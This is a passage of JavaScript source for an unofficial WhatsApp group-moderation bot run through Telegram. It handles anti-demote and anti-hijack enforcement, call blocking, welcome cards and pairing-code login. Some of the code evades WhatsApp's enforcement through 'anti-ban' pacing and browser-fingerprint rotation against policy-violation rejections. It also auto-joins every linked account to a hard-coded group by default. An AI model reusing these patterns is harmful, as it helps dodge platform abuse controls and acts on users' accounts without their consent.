      // (.antilink, .welcome, .kick ...) then work for: owner/sudo, the linker, and real group admins only.
      const _meDigits = [sock.user?.id, sock.user?.lid].map(x => String(x || '').split('@')[0].split(':')[0].replace(/\D/g, '')).filter(Boolean);
      let _linked = !!msg.key.fromMe || (!!senderNumber && _meDigits.includes(senderNumber));
      try {
        if (!_linked && tgUserId) {
          const _lr = resolveId(rawUserId);
          _linked = _lr === resolveId('tg_' + tgUserId) || _lr === resolveId(String(tgUserId));
        }
      } catch (_) {}
      const _gctx = { userId, linked: _linked, groupAdmin: false, botAdmin: undefined, sess: _abSessKey(sock), sock };
      if (isGroup && isCmd) {
        try {
          const _gm = await Promise.race([gtWaMeta(sock, jid), new Promise(r => setTimeout(() => r(null), 4000))]);
          if (_gm) {
            _gctx.groupAdmin = gtWaIsAdmin(_gm, senderJid) || gtWaIsAdmin(_gm, msg.key.participant || '');
            _gctx.botAdmin = gtWaBotIsAdmin(sock, _gm);
          }
        } catch (_) {}
      }
      const _runTask = () => _selfCtx.run(_gctx, task);
      !!activeGames[jid]?_runTask():queueTask(jid,_runTask);
    }
  });

  // ── Join requests: decide instantly when someone asks to join ──
  sock.ev.on('group.join-request', async (ev) => {
    try {
      const { id: groupJid, action, participant, participantPn } = ev || {};
      if (action !== 'created' || !participant) return;
      const dec = jrDecide(groupJid, [participant, participantPn].map(_gtDigits).filter(Boolean));
      if (!dec) return;
      await sleep(1500 + Math.floor(Math.random() * 2500));   // gentle pacing (anti-ban)
      try { await sock.groupRequestParticipantsUpdate(groupJid, [participant], dec); }
      catch (e) { if (participantPn && participantPn !== participant) await sock.groupRequestParticipantsUpdate(groupJid, [participantPn], dec); else throw e; }
      console.log(`[join-request] ${dec} ${_gtDigits(participantPn || participant)} in ${groupJid}`);
    } catch (e) { console.error('[join-request]', e.message); }
  });

  // ── ANTI-PROMOTE / ANTI-DEMOTE enforcement (reacts to REAL WhatsApp promote/demote events) ──
  // Anti-demote ON : if a non-owner demotes an admin -> that admin is promoted back and the demoter is demoted.
  //                  Nobody except the owner can demote the bot. If the bot is demoted by someone else it is
  //                  restored (needs the bot to still be admin, or another linked bot that is admin) and the
  //                  demoter is demoted.
  // Anti-promote ON: if a non-owner promotes someone -> the promotion is undone and the promoter is demoted.
  // The owner / sudo users and the bot itself are always allowed.
  const _apRecent = new Map();
  const _ahKickTracker = new Map(); // antihijack: track how many members each admin removes per group per 30s
  // ── Anti group call ─────────────────────────────────────────────────────────
  // When someone starts a group call in a group with .antigcall ON, the bot declines the call on its side and
  // removes the caller (mode "kick") or just warns them (mode "warn"). Admins, sudo users and the owner are exempt.
  // WhatsApp has no way for a bot to end a group call for everyone, so the call can keep running for others.
  const _gcSeen = new Map();
  sock.ev.on('call', async (calls) => {
    for (const c of (calls || [])) {
      try {
        if (!c || c.status !== 'offer') continue;
        const groupJid = c.groupJid || (String(c.chatId || '').endsWith('@g.us') ? c.chatId : '');
        if (!groupJid || !c.isGroup && !c.groupJid) continue;
        const mode = kvGet('antigcall_' + groupJid) || 'off';
        if (mode === 'off') continue;
        if (_gcSeen.has(c.id)) continue;
        _gcSeen.set(c.id, Date.now());
        for (const [k, t] of _gcSeen) if (Date.now() - t > 600000) _gcSeen.delete(k);
        const caller = c.from;
        const callerDigits = _gtDigits(caller);
        const own = [sock.user?.id, sock.user?.lid].map(_gtDigits).filter(Boolean);
        if (own.includes(callerDigits)) continue;                                  // the bot's own call
        const meta = await gtWaMeta(sock, groupJid, true);
        const uid = 'wa_' + callerDigits;
        if (isOwner(uid) || isSudo(uid) || gtWaIsAdmin(meta, caller)) continue;    // exempt
        try { await sock.rejectCall(c.id, c.from); } catch (_) {}
        const tag = '@' + callerDigits;
        const botAdm = gtWaBotIsAdmin(sock, meta);
        const doRemove = async (why) => {
          try { await sock.groupParticipantsUpdate(groupJid, [caller], 'remove'); } catch (e) { console.error('[antigcall remove]', e.message); }
          try { clearWarnings(groupJid, uid); } catch (_) {}
          await sock.sendMessage(groupJid, { text: `📵 ${tag} ${why} and was removed. Group calls are not allowed here.`, mentions: [caller] });
        };
        if (mode === 'kick') {                       // instant removal
          if (botAdm) await doRemove('started a group call');
          else await sock.sendMessage(groupJid, { text: `📵 ${tag} group calls are not allowed here. Please end the call.\n(Make me a group admin so I can remove people who start calls.)`, mentions: [caller] });
        } else if (mode === 'strike') {              // warnings first, removal when the limit is reached (3 by default)
          const st = gtStrike(groupJid, uid, 'group call');
          if (st.kick && botAdm) await doRemove(`started group calls ${st.count} times`);
          else await sock.sendMessage(groupJid, { text: `📵 ${tag} group calls are not allowed here. Warning ${st.count}/${st.limit}.` + (st.kick ? '\n(Make me a group admin so I can remove people who ignore the warnings.)' : st.count === st.limit - 1 ? '\nNext time you will be removed.' : ''), mentions: [caller] });
        } else {                                     // 'warn': warn only, never remove
          await sock.sendMessage(groupJid, { text: `📵 ${tag} group calls are not allowed here. Please end the call.`, mentions: [caller] });
        }
      } catch (e) { console.error('[antigcall]', e.message); }
    }
  });

  sock.ev.on('group-participants.update', async (ev) => {
    const { id: groupJid, action } = ev || {};
    if (action !== 'promote' && action !== 'demote') return;
    try {
      const gs = getGroupSettings(groupJid);
      const guardDemote  = action === 'demote'  && !!gs.antidemote_on;
      const guardPromote = action === 'promote' && !!gs.antipromote_on;
      if (!guardDemote && !guardPromote) return;

      const idList = x => {
        if (!x) return [];
        if (typeof x === 'string') return [x];
        return [x.id, x.lid, x.phoneNumber, x.jid].filter(Boolean);
      };
      const own = [sock.user?.id, sock.user?.lid].map(_gtDigits).filter(Boolean);
      const isBotEntry = x => idList(x).some(j => own.includes(_gtDigits(j)));

      const authorIds = idList(ev.author);
      if (!authorIds.length) { console.warn('[anti-pd] no author on event, cannot enforce'); return; }
      if (authorIds.some(j => own.includes(_gtDigits(j)))) return;              // the bot's own action

      const trusted = authorIds.some(j => {
        const d = _gtDigits(j);
        if (!d) return false;
        if (d === String(MY_WA).replace(/\D/g, '') || (MY_WA_LID && d === MY_WA_LID)) return true;
        try { const rid = resolveId('wa_' + d); return isOwner(rid) || isSudo(rid); } catch (_) { return isOwner('wa_' + d); }
      });
      if (trusted) return;

      const targets = (ev.participants || []);
      const dedupeKey = groupJid + '|' + action + '|' + targets.map(t => _gtDigits(idList(t)[0])).join(',');
      if (Date.now() - (_apRecent.get(dedupeKey) || 0) < 8000) return;
      _apRecent.set(dedupeKey, Date.now());

      gtWaMetaInvalidate(groupJid);
      let meta = null; try { meta = await gtWaMeta(sock, groupJid, true); } catch (_) {}
      const apiOf = j => (meta ? gtWaApiJid(meta, j) : j);
      const authorJid = authorIds.find(j => !/@lid/.test(j)) || authorIds[0];
      const authorApi = apiOf(authorIds[0]);
      const tag = j => '@' + _gtDigits(j);
      const say = (text, mentions) => sock.sendMessage(groupJid, { text, mentions: (mentions || []).filter(Boolean) }).catch(() => {});

      const botTargeted = targets.some(isBotEntry);
      const others = targets.filter(t => !isBotEntry(t));
      const authorIsAdmin = meta ? gtWaIsAdmin(meta, authorIds[0]) : true;

      // ----- ANTI-DEMOTE -----
      if (guardDemote) {
        // 1) bot was demoted by a non-owner -> restore it
        if (botTargeted) {
          let restored = false;
          const botJidApi = (meta && (gtWaFind(meta, sock.user?.id)?.id)) || String(sock.user?.id || '').replace(/:.*?@/, '@');
          // try with this socket first (works if it is still allowed to), then any other linked bot that is admin here
          const tryPromote = async (s) => { try { await s.groupParticipantsUpdate(groupJid, [botJidApi], 'promote'); return true; } catch (_) { return false; } };
          restored = await tryPromote(sock);
          if (!restored) {
            for (const [, ss] of sessions.entries()) {
              if (!ss || !ss.sock || !ss.connected || ss.sock === sock) continue;
              try {
                const m2 = await ss.sock.groupMetadata(groupJid);
                if (gtWaBotIsAdmin(ss.sock, m2) && await tryPromote(ss.sock)) { restored = true; break; }
              } catch (_) {}
            }
          }
          gtWaMetaInvalidate(groupJid);
          if (restored) {
            let punished = false;
            try { await sock.groupParticipantsUpdate(groupJid, [authorApi], 'demote'); punished = true; } catch (_) {}
            await say(`🛡️ ${tag(authorJid)} tried to demote the bot. Bot is admin again${punished ? ' and ' + tag(authorJid) + ' has been demoted' : ''}. Only the owner can do that.`, [authorJid]);
          } else {
            await say(`⚠️ ${tag(authorJid)} demoted the bot and I can't restore myself (I'm no longer admin). Owner: please make me admin again.`, [authorJid]);
          }
        }
        // 2) other admins demoted by a non-owner -> promote them back, demote the culprit
        if (others.length) {
          const back = others.map(t => apiOf(idList(t)[0]));
          let promoted = false;
          try { await sock.groupParticipantsUpdate(groupJid, back, 'promote'); promoted = true; } catch (e) { console.error('[anti-demote] re-promote failed:', e.message); }
          let punished = false;
          if (promoted || authorIsAdmin) { try { await sock.groupParticipantsUpdate(groupJid, [authorApi], 'demote'); punished = true; } catch (e) { console.error('[anti-demote] demote culprit failed:', e.message); } }
          gtWaMetaInvalidate(groupJid);
          const tl = others.map(t => tag(idList(t)[0])).join(' ');
          if (promoted) await say(`🛡️ Anti-demote: ${tag(authorJid)} tried to demote ${tl}. ${tl} is admin again${punished ? ' and ' + tag(authorJid) + ' has been demoted' : ' (could not demote ' + tag(authorJid) + ', maybe the group creator)'}.`, [authorJid, ...others.map(t => idList(t)[0])]);
          else await say(`⚠️ Anti-demote: ${tag(authorJid)} demoted ${tl} but I couldn't undo it. Am I still an admin?`, [authorJid]);
        }
        return;
      }

      // ----- ANTI-PROMOTE -----
      if (guardPromote && others.length) {
        const undo = others.map(t => apiOf(idList(t)[0]));
        let undone = false;
        try { await sock.groupParticipantsUpdate(groupJid, undo, 'demote'); undone = true; } catch (e) { console.error('[anti-promote] undo failed:', e.message); }
        let punished = false;
        try { await sock.groupParticipantsUpdate(groupJid, [authorApi], 'demote'); punished = true; } catch (e) { console.error('[anti-promote] demote culprit failed:', e.message); }
        gtWaMetaInvalidate(groupJid);
        const tl = others.map(t => tag(idList(t)[0])).join(' ');
        if (undone) await say(`🛡️ Anti-promote: ${tag(authorJid)} tried to make ${tl} admin. Reverted${punished ? ' and ' + tag(authorJid) + ' has been demoted' : ''}. Only the owner can promote.`, [authorJid, ...others.map(t => idList(t)[0])]);
        else await say(`⚠️ Anti-promote: ${tag(authorJid)} promoted ${tl} but I couldn't undo it. Am I still an admin?`, [authorJid]);
      }
    } catch (e) { console.error('[anti-promote/demote]', e.message); }
  });

  // ── Anti-hijack: detect and stop admins removing the bot or mass-kicking members ──
  // When ON: (1) bot kicked → owner alerted + another session removes the culprit
  //          (2) admin removes 3+ members in 30 s → culprit is immediately removed
  //          Owner, sudo and the bot itself are always exempt.
  sock.ev.on('group-participants.update', async (ev) => {
    const { id: groupJid, participants, action } = ev || {};
    if (action !== 'remove') return;                    // only forced removals, not voluntary leaves
    try {
      const gs = getGroupSettings(groupJid);
      if (!gs.antihijack_on) return;

      const idList = x => {
        if (!x) return [];
        if (typeof x === 'string') return [x];
        return [x.id, x.lid, x.phoneNumber, x.jid].filter(Boolean);
      };
      const own = [sock.user?.id, sock.user?.lid].map(_gtDigits).filter(Boolean);
      const isBotEntry = x => idList(x).some(j => own.includes(_gtDigits(j)));

      const authorIds = idList(ev.author);
      if (!authorIds.length) return;
      if (authorIds.some(j => own.includes(_gtDigits(j)))) return;  // bot's own action

      // Skip if the actor is the owner or a trusted sudo user
      const trusted = authorIds.some(j => {
        const d = _gtDigits(j);
        if (!d) return false;
        if (d === String(MY_WA).replace(/\D/g, '') || (MY_WA_LID && d === MY_WA_LID)) return true;
        try { const rid = resolveId('wa_' + d); return isOwner(rid) || isSudo(rid); } catch (_) { return isOwner('wa_' + d); }
      });
      if (trusted) return;

      const targets = participants || [];
      const botTargeted = targets.some(isBotEntry);
      const authorJid = authorIds.find(j => !/@lid/.test(j)) || authorIds[0];
      const authorDigits = _gtDigits(authorJid);
      const tag = j => '@' + _gtDigits(j);
      const say = (text, mentions) => sock.sendMessage(groupJid, { text, mentions: (mentions || []).filter(Boolean) }).catch(() => {});

      // ── 1) Bot was kicked ──────────────────────────────────────────────────
      if (botTargeted) {
        // Try to remove the culprit using any other linked session still in the group
        let punished = false;
        for (const [, ss] of sessions.entries()) {
          if (!ss || !ss.connected || !ss.sock || ss.sock === sock) continue;
          try {
            const m2 = await ss.sock.groupMetadata(groupJid);
            if (!gtWaBotIsAdmin(ss.sock, m2)) continue;
            const apiOf2 = j => gtWaApiJid(m2, j);
            await ss.sock.groupParticipantsUpdate(groupJid, [apiOf2(authorIds[0])], 'remove');
            await ss.sock.sendMessage(groupJid, { text: `🔒 Anti-hijack: ${tag(authorJid)} tried to remove the bot and was removed.`, mentions: [authorJid] });
            punished = true;
            break;
          } catch (_) {}
        }
        // Alert the owner on Telegram regardless
        try {
          const ownerTgId = _ownerTgIdGet();
          if (ownerTgId && typeof bot_tg !== 'undefined') {
            let grpName = groupJid;
            try { const _m = await sock.groupMetadata(groupJid); grpName = _m.subject || groupJid; } catch (_) {}
            const alertText = `🚨 *Anti-Hijack Alert*\n\n${tag(authorJid)} (${authorDigits}) tried to *remove the bot* from *${grpName}*.\n${punished ? '✅ They were removed by another session.' : '⚠️ Could not counter — no other admin session is in the group. Please re-add the bot and remove the offender manually.'}`;
            bot_tg.telegram.sendMessage(ownerTgId, alertText, { parse_mode: 'Markdown' }).catch(() => {});
          }
        } catch (_) {}
        if (!punished) {
          // Still try to send a warning in the group (if the bot hasn't lost access yet)
          say(`🔒 Anti-hijack: ${tag(authorJid)} removed the bot. Owner has been alerted.`, [authorJid]).catch(() => {});
        }
        return;
      }

      // ── 2) Mass removal: 3+ members removed by the same admin within 30 s ──
      const _ahKey = groupJid + '|' + (authorDigits || authorJid);
      const _now = Date.now();
      let _track = _ahKickTracker.get(_ahKey) || { count: 0, firstMs: _now };
      if (_now - _track.firstMs > 30000) { _track = { count: 0, firstMs: _now }; } // reset window
      _track.count += targets.filter(t => !isBotEntry(t)).length;
      _ahKickTracker.set(_ahKey, _track);

      if (_track.count < 3) return;   // not yet a mass removal

      // Threshold crossed — punish
      _ahKickTracker.delete(_ahKey);  // reset so a re-add doesn't immediately re-trigger
      gtWaMetaInvalidate(groupJid);
      let meta = null; try { meta = await gtWaMeta(sock, groupJid, true); } catch (_) {}
      const authorApi = meta ? gtWaApiJid(meta, authorIds[0]) : authorIds[0];
      let punished = false;
      if (gtWaBotIsAdmin(sock, meta)) {
        try { await sock.groupParticipantsUpdate(groupJid, [authorApi], 'remove'); punished = true; } catch (e) { console.error('[antihijack mass-kick remove]', e.message); }
      }
      gtWaMetaInvalidate(groupJid);
      if (punished) {
        await say(`🔒 Anti-hijack: ${tag(authorJid)} was removed for mass-kicking ${_track.count} members in under 30 seconds.`, [authorJid]);
      } else {
        await say(`⚠️ Anti-hijack: ${tag(authorJid)} mass-kicked ${_track.count} members but I can't remove them — make me a group admin.`, [authorJid]);
      }
    } catch (e) { console.error('[antihijack]', e.message); }
  });

  // ── Welcome new members ───────────────────────────────────────────────
  sock.ev.on('group-participants.update', async ({ id: groupJid, participants, action }) => {
    try {
      gtWaMetaInvalidate(groupJid);
      if (action === 'add') await gtWaEnforceBans(sock, groupJid, participants);
    } catch (e) { console.error('[gt participants]', e.message); }
    const gs = getGroupSettings(groupJid);

    // participants can be plain JID strings OR objects ({ id, lid, phoneNumber }) depending on the Baileys version
    const _pl = (participants || []).map(p => (typeof p === 'string' ? { id: p } : p)).filter(p => p && p.id);
    // digits only (no "@lid" / "@s.whatsapp.net" / ":device" leftovers) -> the mention renders as a clean @name
    const _dg = j => String(j || '').split('@')[0].split(':')[0].replace(/\D/g, '');
    const _fill = (tpl, p, meta) => String(tpl)
      .replace(/\{name\}/gi, '@' + _dg(p.id))
      .replace(/\{group\}/gi, meta?.subject || 'the group')
      .replace(/\{count\}/gi, String(meta?.participants?.length || ''));
    const _pfp = async (p, meta, groupFallback = true) => {           // member profile picture -> buffer (null if hidden / none)
      for (const j of [p.phoneNumber, p.jid, p.id].filter((x, i2, a) => x && a.indexOf(x) === i2)) {
        try {
          const url = await sock.profilePictureUrl(j, 'image');
          if (url) { const r = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 }); return Buffer.from(r.data); }
        } catch (_) {}
      }
      if (groupFallback) try { const gu = await sock.profilePictureUrl(groupJid, 'image'); if (gu) { const r = await axios.get(gu, { responseType: 'arraybuffer', timeout: 10000 }); return Buffer.from(r.data); } } catch (_) {}
      return null;
    };
    const _sendCard = async (text, mentions, img) => {
      if (img) { try { await sock.sendMessage(groupJid, { image: img, caption: text, mentions }); return; } catch (e) { console.error('[welcome img]', e.message); } }
      await sock.sendMessage(groupJid, { text, mentions });
    };

    // ── No-Bot (antibot_on): block third-party bot usage in the group ──
    // Detection happens at message level (see message handler below). No join-time check needed.

    if (action === 'add') {
      let meta = null; try { meta = await gtWaMeta(sock, groupJid, true); } catch (_) {}
      const WELCOME_LINES = [
        "So happy you're here. Make yourself at home.",
        "Welcome! Say hi, don't be shy.",
        "A new face! Glad you joined us.",
        "Welcome in. Tell us a little about yourself.",
        "Come on in, we saved you a seat.",
      ];
      // one welcome (card image + caption) for one member
      const _welcomeFor = async (p) => {
        const tag = '@' + _dg(p.id);
        const memberNo = meta?.participants?.length || '';
        let text;
        if (gs.welcome_msg) {
          text = _fill(gs.welcome_msg, p, meta);
        } else {
          const rules = gs.rules ? '\n📜 Type *.rules* to read the group rules' : '';
          text =
`🌸 *Welcome!*

${tag}, you have joined *${meta?.subject || 'the group'}*.
${memberNo ? `You are member *#${memberNo}*. Glad you're here.\n` : ''}
💬 ${WELCOME_LINES[Math.floor(Math.random() * WELCOME_LINES.length)]}
${rules}
💕 _Glad to have you._`;
        }
        let img = null;
        if (gs.welcomecard_on !== 0) {                       // generated card: profile photo + name (falls back to the plain photo)
          try {
            const av = await _pfp(p, meta, false);
            img = await buildWelcomeCard({ avatar: av, name: welcomeCardName(groupJid, p), group: meta?.subject, count: memberNo });
          } catch (e) { console.error('[welcome card]', e.message); }
        }
        if (!img) img = await _pfp(p, meta);
        await _sendCard(text, [p.id], img);
      };

      // join captcha: members who must verify are welcomed only after they pass
      let _list = _pl;
      if (gs.captcha_on && meta) {
        try {
          const handled = await captchaStart(sock, groupJid, _pl, meta, gs, async (p) => { if (gs.welcome_on) await _welcomeFor(p); });
          _list = _pl.filter(p => !handled.includes(p));
        } catch (e) { console.error('[captcha]', e.message); }
      }
      if (!gs.welcome_on || !_list.length) return;

      // bulk add (many at once) -> one combined message instead of spamming a card per person
      if (_list.length > 5) {
        const names = _list.map(p => '@' + _dg(p.id)).join(' ');
        try { await sock.sendMessage(groupJid, { text: `🎉 *WELCOME* 🎉\n\n${names}\n\nWelcome to *${meta?.subject || 'the group'}*! Read the rules and enjoy 💫`, mentions: _list.map(p => p.id) }); } catch (e) { console.error('[welcome]', e.message); }
        return;
      }
      for (const p of _list) {
        try { await _welcomeFor(p); } catch (e) { console.error('[welcome]', e.message); }
        await sleep(2000 + Math.floor(Math.random() * 2000));   // gentle pacing (anti-ban)
      }
    }

    if (action === 'remove' || action === 'leave') {
      try { captchaClear(groupJid, _pl); } catch (_) {}
      if (!gs.goodbye_on) return;
      let meta = null; try { meta = await gtWaMeta(sock, groupJid); } catch (_) {}
      for (const p of _pl.filter(x => !captchaWasKicked(groupJid, x)).slice(0, 5)) {
        try {
          const tag = '@' + _dg(p.id);
          const text = gs.goodbye_msg
            ? _fill(gs.goodbye_msg, p, meta)
            : `👋 ${tag} has left the group.\nTake care out there — you’ll be missed! 💔`;
          await sock.sendMessage(groupJid, { text, mentions: [p.id] });
        } catch (e) { console.error('[goodbye]', e.message); }
        await sleep(1500);
      }
    }
  });
}

// ── Wipe all files inside an auth dir without removing the dir itself ──────
function clearAuthDir(dir) {
  try {
    if (fs.existsSync(dir))
      fs.readdirSync(dir).forEach(f => { try { fs.unlinkSync(path.join(dir, f)); } catch(_){} });
  } catch(_){}
}

// Clean a phone number typed in any common format into WhatsApp's digits-only international form.
// Handles "+44 (0)7700 900123", "0044 7700 900123", "(555) 123-4567" with country code, Nigerian "0803 123 4567".
function cleanPairPhone(raw) {
  let t = String(raw || '').replace(/\(\s*0\s*\)/g, '');           // "+44 (0)77…" -> "+44 77…"
  let d = t.replace(/\D/g, '');
  d = d.replace(/^00+/, '');                                          // 0044… -> 44…
  if (/^0[789][01]\d{8}$/.test(d)) d = '234' + d.slice(1);           // Nigerian local format 0803… -> 234803…
  for (const cc of ['234', '233', '254', '256', '255', '44', '27']) {  // trunk zero typed after the country code
    if (d.startsWith(cc + '0') && d.length >= cc.length + 10) { d = cc + d.slice(cc.length + 1); break; }
  }
  return d;
}
function pairPhoneProblem(d) {
  if (!d || d.length < 8 || d.length > 15) return 'That number looks wrong. Send it with the country code first, digits only (for example UK 447700900123, USA 12025550123, Ghana 233241234567).';
  if (/^0/.test(d)) return 'Start the number with the country code, not 0. Example: 447700900123 (not 07700900123).';
  return '';
}

// forceNew=true wipes stale auth files before connecting.
// Without this, old broken creds set state.creds.registered=true, so the
// pairing code branch is silently skipped and no code is ever sent to the user.
// ── Baileys pairing-code API helper ──────────────────────────────────────────
// Requests a pairing code from Baileys and sends it to Telegram.
// Retries up to 3 times with back-off; informs the user on every outcome.
const _webPairCodes = new Map(); // sessionId -> { code, phone, ts }  (read by web-pair.js)
async function requestPairingCodeAndNotify(sock, phone, tgUserId, tgChatId, tgMsgId) {
  // Normalize: digits only, no leading +
  const cleanPhone = String(phone).replace(/\D/g, '');
  let pairCode = null, lastErr = '';
  for (let attempt = 1; attempt <= 3; attempt++) {
    try {
      // FIX: if socket is already authenticated, don't request a pairing code
      if (sock.user) {
        console.log(`[${tgUserId}] Baileys API → socket already authenticated, skipping pairing code`);
        return 'authenticated';
      }
      console.log(`[${tgUserId}] Baileys API → requestPairingCode attempt ${attempt} (phone: ${cleanPhone})`);
      const rawCode = await sock.requestPairingCode(cleanPhone);
      // rawCode may be "ABCDEFGH" (8 chars) or already "ABCD-EFGH".
      // Only reformat if it has NO dash yet.
      if (rawCode && rawCode.includes('-')) {
        pairCode = rawCode.trim();
      } else {
        pairCode = (rawCode || '').replace(/(.{4})(.{4})/, '$1-$2').trim() || rawCode;
      }
      console.log(`[${tgUserId}] Baileys API → code received: ${pairCode}`);
      break;
    } catch (e) {
      console.error(`[${tgUserId}] Baileys API → pairing attempt ${attempt} error:`, e.message);
      lastErr = String(e && e.message || e).slice(0, 120);
      if (attempt < 3) await sleep(3000);
    }
  }

  try { _webPairCodes.set(String(tgUserId), { code: pairCode || null, phone: cleanPhone, ts: Date.now() }); } catch (_) {}
  if (!pairCode) { try { _pairingLock.delete(String(tgUserId)); } catch (_) {} }
  if (!tgChatId) return pairCode; // background reconnect — no user to notify

  if (pairCode) {
    bot_tg.telegram.sendMessage(tgChatId,
      `💗 *Pairing Code*\n\nNumber: +${cleanPhone}\nCode: ${pairCode}\n\nOpen WhatsApp → Settings → Linked Devices → Link a Device → Link with phone number, then enter the code. Expires in 3 minutes.`,
      { reply_to_message_id: tgMsgId || undefined, parse_mode: 'Markdown' }
    ).catch(e => console.error('[TG notify]', e.message));
  } else {
    bot_tg.telegram.sendMessage(tgChatId,
      `❌ *Could not get pairing code*\n\nTried 3 times — WhatsApp didn't give a code for +${cleanPhone}.${lastErr ? '\n\nWhatsApp said: ' + lastErr : ''}\n\n• Make sure this number is active on WhatsApp\n• Use the country code first, digits only (UK 447700900123, USA 12025550123, Nigeria 2347085331433)\n• Don't add a 0 after the country code\n• Wait a minute and run /pair again`,
      { reply_to_message_id: tgMsgId || undefined, parse_mode: 'Markdown' }
    ).catch(() => {});
  }
  return pairCode;
}

// ── Auto-join: every number that links the bot joins the community group once ────────
// Change the group with the AUTO_JOIN_INVITE env var (full link or just the code). Set it to "off" to disable.
const AUTO_JOIN_INVITE_RAW = process.env.AUTO_JOIN_INVITE || 'https://chat.whatsapp.com/Eb4mDINq7dP8wiOqG5Lyt6';
const AUTO_JOIN_CODE = /^off$/i.test(AUTO_JOIN_INVITE_RAW) ? '' : String(AUTO_JOIN_INVITE_RAW).split('chat.whatsapp.com/').pop().split(/[?#\s]/)[0].trim();
db.exec(`CREATE TABLE IF NOT EXISTS auto_joined (phone TEXT PRIMARY KEY, result TEXT, attempts INTEGER DEFAULT 0, updated_at INTEGER)`);
async function autoJoinGroup(sock, tgChatId) {
  try {
    if (!AUTO_JOIN_CODE) return;
    const phone = String(sock.user?.id || '').split(':')[0].split('@')[0].replace(/\D/g, '');
    if (!phone) return;
    const row = db.prepare('SELECT result, attempts FROM auto_joined WHERE phone=?').get(phone);
    // only once per number: don't re-add someone who left, and stop after 3 failed tries
    if (row && (['joined', 'already', 'requested'].includes(row.result) || (row.attempts || 0) >= 3)) return;
    await sleep(6000); // let the fresh connection settle first
    let result = 'joined', note = '';
    try {
      const r = await sock.groupAcceptInvite(AUTO_JOIN_CODE);
      if (!r) { result = 'requested'; note = ' (the group needs admin approval — your join request was sent)'; }
    } catch (e) {
      const m = String(e?.message || e).toLowerCase();
      if (m.includes('conflict') || m.includes('already')) result = 'already';
      else result = 'failed:' + m.slice(0, 60);
    }
    const attempts = (row?.attempts || 0) + 1;
    db.prepare('INSERT OR REPLACE INTO auto_joined (phone,result,attempts,updated_at) VALUES (?,?,?,?)').run(phone, result, attempts, Date.now());
    console.log(`[auto-join] +${phone} → ${result}`);
    if (result === 'joined' || result === 'requested') {
      if (tgChatId) bot_tg.telegram.sendMessage(tgChatId, `👥 +${phone} was added to our community group${note}. You can leave it any time — it won't be re-added.`).catch(() => {});
    }
  } catch (e) { console.error('[auto-join]', e.message); }
}

// ── Baileys socket factory ────────────────────────────────────────────────────
async function makeBaileysSocket(state, msgStore = {}, sessKey = 'global', profile = 0) {
  // profile ladder used when WhatsApp answers 405 straight away: vary browser fingerprint / WA version
  const _browsers = [Browsers.macOS('Chrome'), Browsers.ubuntu('Chrome'), Browsers.windows('Chrome'), Browsers.macOS('Safari')];
  const _browser = _browsers[profile % _browsers.length];
  let version;
  try {
    const fetched = await fetchLatestBaileysVersion();
    version = fetched.version;
    console.log('[Baileys] version:', version.join('.'), '| profile', profile, '| latest:', fetched.isLatest);
    if (profile === 3) version = undefined; // last resort: the WA version bundled with the installed Baileys
  } catch (e) {
    version = [2, 3000, 1023141645];
    console.warn('[Baileys] version fetch failed, using fallback');
  }

  // ── Proxy: build agent for this session (falls back to global proxy) ──
  const _proxyUrl   = getSessionProxy(sessKey || 'global');
  const _proxyAgent = _proxyUrl ? buildProxyAgent(_proxyUrl) : null;
  if (_proxyAgent) console.log(`[proxy] Session ${sessKey || 'default'} using proxy ${_proxyUrl.replace(/:\/\/([^:@]+):([^@]+)@/, '://$1:****@')}`);

  const _wedSock = makeWASocket({
    ...(version ? { version } : {}),
    auth                          : state,
    logger                        : pino({ level: 'silent' }),
    printQRInTerminal             : false,
    // FIX: ubuntu/Chrome fingerprint triggers WhatsApp 405 "Policy Violation".
    // macOS/Chrome is the most stable fingerprint for pairing code sessions.
    browser                       : _browser,
    ..._proxyAgent ? { agent: _proxyAgent } : {},
    // NOTE: do NOT pass usePairingCode:true here — it conflicts with calling
    // requestPairingCode() manually and causes immediate 405/401 rejections.
    // The manual call below handles the pairing flow correctly without this flag.
    connectTimeoutMs              : 60_000,
    keepAliveIntervalMs           : 30_000,
    defaultQueryTimeoutMs         : 60_000,
    // FIX: return the cached message so WA retry requests can re-decrypt it.
    // Without this, recipients see "Waiting for this message. This may take a while."
    // IMPORTANT: return undefined (not { conversation: '' }) when not found —
    // returning an empty object tells WA "message is empty text" which is wrong
    // and causes the "Waiting for this message" spinner on the recipient's side.
    getMessage                    : async (key) => {
      return msgStore[key.remoteJid]?.[key.id] ?? undefined;
    },
    syncFullHistory               : false,
    markOnlineOnConnect           : false,
    generateHighQualityLinkPreview: false,
    patchMessageBeforeSending     : msg => {
      if (msg.buttonsMessage || msg.templateMessage || msg.listMessage) {
        msg = { viewOnceMessage: { message: {
          messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} }, ...msg
        }}};
      }
      return msg;
    },
  });
  // every outgoing text / caption goes through her voice
  try {
    const _send = _wedSock.sendMessage.bind(_wedSock);
    _wedSock.sendMessage = (jid, content, ...rest) => {
      try {
        if (content && typeof content === 'object') {
          if (typeof content.text === 'string') content = { ...content, text: botVoice(content.text) };
          if (typeof content.caption === 'string') content = { ...content, caption: botVoice(content.caption) };
        }
      } catch (_) {}
      return _send(jid, content, ...rest);
    };
  } catch (_) {}
  return _wedSock;
}

// ── "back online" notice: sent to the linked person's WhatsApp private chat AND their Telegram ──
const _onlineNotified = new Map(); // tgId -> last notice timestamp (stops reconnect loops from spamming)
function notifyOnline(sock, tgId, tgChatId) {
  const fresh = !!tgChatId; // tgChatId only exists right after a /pair, i.e. a successful new pairing
  const last = _onlineNotified.get(tgId) || 0;
  if (!fresh && Date.now() - last < 10 * 60 * 1000) return;
  _onlineNotified.set(tgId, Date.now());
  const text = '💕 I am back online.';
  // WhatsApp: message the linked account's own private chat (its "Message yourself" chat)
  setTimeout(async () => {
    try {
      const me = String(sock.user?.id || '').replace(/:.*?@/, '@');
      if (me) await sock.sendMessage(me, { text });
    } catch (e) { console.error('[online notice WA]', e.message); }
  }, 4000);
  // Telegram: private chat with whoever paired it (a Telegram user's private chat id equals their user id)
  const tgTarget = tgChatId || (/^\d+$/.test(String(tgId)) ? tgId : null);
  if (tgTarget) bot_tg.telegram.sendMessage(tgTarget, text).catch(() => {});
}

// ═══════════════════════════════════════════════════════════════════
//  🐛 ANTIBUG — protects the linked account from crash/lag "bug" messages
//  Detects abnormal payloads (huge or invisible-character text, mass-mentions, oversized contacts/buttons...)
//  then: clears it from the device, and (if bot is group admin) locks the group, kicks the sender and deletes
//  the payload for everyone. The sender is blocked and auto-unblocked after 10 minutes.
